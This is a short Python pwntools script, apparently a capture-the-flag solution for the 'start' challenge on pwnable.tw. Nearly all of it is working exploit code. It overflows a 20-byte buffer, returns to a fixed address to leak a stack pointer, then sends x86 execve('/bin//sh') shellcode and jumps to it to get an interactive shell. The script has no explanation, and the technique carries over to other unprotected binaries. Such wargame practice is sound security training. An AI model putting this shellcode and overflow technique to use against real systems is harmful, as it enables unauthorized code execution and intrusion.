from pwn import *

#p = process("./start")
p = remote("chall.pwnable.tw", 10000)
print p.recv()

shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
)

payload = "a"*20
payload += p32(0x08048087)
p.send(payload)

leaked = u32(p.recv(4))					# leak stack addr
addr_shellcode = leaked + 20
log.info("leaked = " + hex(leaked))
log.info("addr_shellcode = " + hex(addr_shellcode))

print p.recv()
raw_input()
payload = "a"*20
payload += p32(addr_shellcode)
payload += shellcode
p.send(payload)
p.interactive()
